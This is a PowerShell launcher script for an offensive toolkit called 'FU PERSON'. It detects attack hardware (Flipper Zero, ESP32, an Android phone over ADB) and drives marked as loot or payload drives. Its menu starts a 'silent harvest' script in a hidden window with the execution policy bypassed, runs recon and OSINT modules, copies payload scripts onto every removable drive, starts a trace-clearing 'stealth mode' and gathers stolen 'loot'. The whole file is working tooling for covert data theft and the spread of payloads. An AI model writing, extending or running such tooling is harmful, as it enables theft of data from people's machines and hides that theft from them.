<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | MASTER LAUNCHER v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  Five devices. One platform. Total operational control.          ║
   ║  Pure PowerShell | Zero Dependencies | Insert and Dominate       ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

$ErrorActionPreference = 'SilentlyContinue'
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$version = "2.0"

function Show-Banner {
    $banner = @"

    ███████╗██╗   ██╗    ██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗
    ██╔════╝██║   ██║    ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║
    █████╗  ██║   ██║    ██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║
    ██╔══╝  ██║   ██║    ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║
    ██║     ╚██████╔╝    ██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║
    ╚═╝      ╚═════╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝

"@
    Write-Host $banner -ForegroundColor Cyan
    Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor DarkCyan
    Write-Host "    ║  FLLC Operations Platform v$version                          ║" -ForegroundColor DarkCyan
    Write-Host "    ║  Pure PowerShell | Zero Dependencies                     ║" -ForegroundColor DarkCyan
    Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor DarkCyan
}

function Show-DeviceStatus {
    Write-Host "`n    [*] Scanning connected devices..." -ForegroundColor DarkGray
    Start-Sleep -Milliseconds 300

    $flipperConnected = $false
    $esp32Connected = $false
    $androidConnected = $false
    $usbDriveReady = $false
    $microsdReady = $false

    $comPorts = Get-WmiObject Win32_SerialPort 2>$null
    if ($comPorts) {
        foreach ($port in $comPorts) {
            $desc = $port.Description.ToLower()
            if ($desc -match 'flipper') { $flipperConnected = $true }
            if ($desc -match 'cp210|ch340|esp32|silicon labs') { $esp32Connected = $true }
        }
    }

    try {
        $adbResult = & adb devices 2>$null | Select-String "device$"
        if ($adbResult) { $androidConnected = $true }
    } catch { }

    $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2" 2>$null
    foreach ($drive in $drives) {
        $lootMarker = Join-Path $drive.DeviceID ".loot_target"
        $payloadDir = Join-Path $drive.DeviceID ".p"
        if (Test-Path $lootMarker) { $microsdReady = $true }
        if (Test-Path $payloadDir) { $usbDriveReady = $true }
    }

    $flipperStatus = if ($flipperConnected) { "[+] CONNECTED" } else { "[-] NOT FOUND" }
    $flipperColor = if ($flipperConnected) { "Green" } else { "DarkGray" }
    $esp32Status = if ($esp32Connected) { "[+] CONNECTED" } else { "[-] NOT FOUND" }
    $esp32Color = if ($esp32Connected) { "Green" } else { "DarkGray" }
    $androidStatus = if ($androidConnected) { "[+] CONNECTED" } else { "[-] NOT FOUND" }
    $androidColor = if ($androidConnected) { "Green" } else { "DarkGray" }
    $usbStatus = if ($usbDriveReady) { "[+] READY" } else { "[-] NOT FOUND" }
    $usbColor = if ($usbDriveReady) { "Green" } else { "DarkGray" }
    $microsdStatus = if ($microsdReady) { "[+] READY" } else { "[-] NOT FOUND" }
    $microsdColor = if ($microsdReady) { "Green" } else { "DarkGray" }

    Write-Host "    ┌─── Device Status ────────────────────────────────────┐" -ForegroundColor DarkCyan
    Write-Host -NoNewline "    │  USB SD Card ........... " -ForegroundColor DarkCyan
    Write-Host -NoNewline $usbStatus -ForegroundColor $usbColor
    Write-Host "                    │" -ForegroundColor DarkCyan
    Write-Host -NoNewline "    │  MicroSD (Loot) ........ " -ForegroundColor DarkCyan
    Write-Host -NoNewline $microsdStatus -ForegroundColor $microsdColor
    Write-Host "                    │" -ForegroundColor DarkCyan
    Write-Host -NoNewline "    │  Flipper Zero .......... " -ForegroundColor DarkCyan
    Write-Host -NoNewline $flipperStatus -ForegroundColor $flipperColor
    Write-Host "                │" -ForegroundColor DarkCyan
    Write-Host -NoNewline "    │  ESP32 DevKit .......... " -ForegroundColor DarkCyan
    Write-Host -NoNewline $esp32Status -ForegroundColor $esp32Color
    Write-Host "                │" -ForegroundColor DarkCyan
    Write-Host -NoNewline "    │  Galaxy S20+ (ADB) ..... " -ForegroundColor DarkCyan
    Write-Host -NoNewline $androidStatus -ForegroundColor $androidColor
    Write-Host "                │" -ForegroundColor DarkCyan
    Write-Host "    └──────────────────────────────────────────────────────┘" -ForegroundColor DarkCyan
}

function Show-Menu {
    while ($true) {
        Clear-Host
        Show-Banner
        Show-DeviceStatus
        Write-Host ""
        Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
        Write-Host "    ║                    OPERATIONS MENU                        ║" -ForegroundColor Yellow
        Write-Host "    ╠══════════════════════════════════════════════════════════╣" -ForegroundColor Yellow
        Write-Host "    ║  [1] SILENT HARVEST     Extract all data (auto, hidden)  ║" -ForegroundColor Yellow
        Write-Host "    ║  [2] NETWORK RECON      Ports, hosts, WiFi, shares       ║" -ForegroundColor Yellow
        Write-Host "    ║  [3] OSINT TOOLKIT      People, phone, email, domain, IP ║" -ForegroundColor Yellow
        Write-Host "    ║  [4] FULL AUTO          Harvest + recon (background)      ║" -ForegroundColor Yellow
        Write-Host "    ║  ──────────────────────────────────────────────────────  ║" -ForegroundColor DarkYellow
        Write-Host "    ║  [5] DEVICE SYNC        Sync loot from all devices       ║" -ForegroundColor Yellow
        Write-Host "    ║  [6] DEPLOY ALL         Push payloads to all devices     ║" -ForegroundColor Yellow
        Write-Host "    ║  [7] STEALTH MODE       Ultra-quiet, clear all traces    ║" -ForegroundColor Yellow
        Write-Host "    ║  [8] GENERATE REPORT    Aggregate loot into report       ║" -ForegroundColor Yellow
        Write-Host "    ║  ──────────────────────────────────────────────────────  ║" -ForegroundColor DarkYellow
        Write-Host "    ║  [0] EXIT                                                ║" -ForegroundColor Yellow
        Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
        Write-Host ""

        $choice = Read-Host "    root@fuperson:~# select"

        switch ($choice) {
            "1" {
                Write-Host "`n    [*] Launching silent harvest..." -ForegroundColor Cyan
                $harvestPath = Join-Path $scriptDir "harvest.ps1"
                if (Test-Path $harvestPath) {
                    Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -File `"$harvestPath`"" -WindowStyle Hidden
                    Write-Host "    [+] Harvest running in background. Data dumps to MicroSD." -ForegroundColor Green
                    Write-Host "    [+] Check loot\ folder on MicroSD when complete (~60s)" -ForegroundColor Green
                } else {
                    Write-Host "    [!] harvest.ps1 not found at: $harvestPath" -ForegroundColor Red
                }
                Read-Host "`n    Press Enter to continue"
            }
            "2" {
                $reconPath = Join-Path $scriptDir "recon.ps1"
                if (Test-Path $reconPath) {
                    . $reconPath
                    Show-ReconMenu
                } else {
                    Write-Host "    [!] recon.ps1 not found" -ForegroundColor Red
                    Read-Host "`n    Press Enter to continue"
                }
            }
            "3" {
                $osintPath = Join-Path $scriptDir "osint.ps1"
                if (Test-Path $osintPath) {
                    . $osintPath
                    Show-OsintMenu
                } else {
                    Write-Host "    [!] osint.ps1 not found" -ForegroundColor Red
                    Read-Host "`n    Press Enter to continue"
                }
            }
            "4" {
                Write-Host "`n    [*] FULL AUTO MODE ENGAGED" -ForegroundColor Cyan
                Write-Host "    [*] ─────────────────────────────────────" -ForegroundColor DarkCyan
                Write-Host "    [*] Starting silent harvest in background..." -ForegroundColor DarkGray
                $harvestPath = Join-Path $scriptDir "harvest.ps1"
                if (Test-Path $harvestPath) {
                    Start-Process powershell.exe -ArgumentList "-NoP -NonI -W Hidden -Exec Bypass -File `"$harvestPath`"" -WindowStyle Hidden
                    Write-Host "    [+] Harvest running" -ForegroundColor Green
                }

                Write-Host "    [*] Starting network recon..." -ForegroundColor DarkGray
                $reconPath = Join-Path $scriptDir "recon.ps1"
                if (Test-Path $reconPath) {
                    . $reconPath
                    Run-FullRecon
                }

                Write-Host "`n    [+] Full auto complete. All data collected." -ForegroundColor Green
                Read-Host "`n    Press Enter to continue"
            }
            "5" {
                Write-Host "`n    [*] DEVICE SYNC — Aggregating loot from all devices..." -ForegroundColor Cyan
                $syncPath = Join-Path $scriptDir "device_sync.ps1"
                if (Test-Path $syncPath) {
                    . $syncPath
                    Start-DeviceSync
                } else {
                    Write-Host "    [!] device_sync.ps1 not found" -ForegroundColor Red
                }
                Read-Host "`n    Press Enter to continue"
            }
            "6" {
                Write-Host "`n    [*] DEPLOY ALL — Pushing payloads to connected devices..." -ForegroundColor Cyan
                $drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2" 2>$null
                foreach ($drive in $drives) {
                    $targetP = Join-Path $drive.DeviceID ".p"
                    if (-not (Test-Path $targetP)) {
                        New-Item -ItemType Directory -Path $targetP -Force | Out-Null
                    }
                    $scripts = @("harvest.ps1","osint.ps1","recon.ps1","device_sync.ps1","stealth_mode.ps1","report_generator.ps1")
                    foreach ($script in $scripts) {
                        $src = Join-Path $scriptDir $script
                        if (Test-Path $src) {
                            Copy-Item $src -Destination $targetP -Force
                            Write-Host "    [+] Deployed $script to $($drive.DeviceID)" -ForegroundColor Green
                        }
                    }
                }
                Write-Host "    [+] Payload deployment complete." -ForegroundColor Green
                Read-Host "`n    Press Enter to continue"
            }
            "7" {
                Write-Host "`n    [*] STEALTH MODE — Engaging ultra-quiet operation..." -ForegroundColor Cyan
                $stealthPath = Join-Path $scriptDir "stealth_mode.ps1"
                if (Test-Path $stealthPath) {
                    . $stealthPath
                    Start-StealthMode
                } else {
                    Write-Host "    [!] stealth_mode.ps1 not found" -ForegroundColor Red
                }
                Read-Host "`n    Press Enter to continue"
            }
            "8" {
                Write-Host "`n    [*] REPORT GENERATOR — Aggregating all loot..." -ForegroundColor Cyan
                $reportPath = Join-Path $scriptDir "report_generator.ps1"
                if (Test-Path $reportPath) {
                    . $reportPath
                    Start-ReportGeneration
                } else {
                    Write-Host "    [!] report_generator.ps1 not found" -ForegroundColor Red
                }
                Read-Host "`n    Press Enter to continue"
            }
            "0" {
                Write-Host ""
                Write-Host "    ╔══════════════════════════════════════════════════════════╗" -ForegroundColor DarkCyan
                Write-Host "    ║  FLLC out. Stay quiet. Stay dangerous.                   ║" -ForegroundColor DarkCyan
                Write-Host "    ╚══════════════════════════════════════════════════════════╝" -ForegroundColor DarkCyan
                Write-Host ""
                return
            }
            default {
                Write-Host "    [!] Invalid selection" -ForegroundColor Red
                Start-Sleep -Milliseconds 500
            }
        }
    }
}

Show-Menu
